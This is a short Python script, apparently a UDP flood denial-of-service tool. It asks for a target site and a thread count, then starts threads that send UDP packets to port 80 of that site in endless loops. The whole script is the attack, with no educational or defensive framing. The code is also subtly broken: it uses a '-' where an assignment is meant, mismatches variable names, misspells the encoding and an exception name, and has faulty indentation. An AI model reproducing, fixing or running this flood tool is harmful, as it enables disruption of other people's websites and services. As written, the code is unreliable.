
import time
import socket
import sys
import _thread
site - input("Enter your site url -> ")
thread_count = input("Enter your thread ->")
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = "369"
print("UDP target IP:", IP)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF.8"), (ip, UDP_PORT))
        print("packet sent")
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread." + str(i),))
     except keyboardInterrupt:
         sys.exit(0)  
while 1:
    pass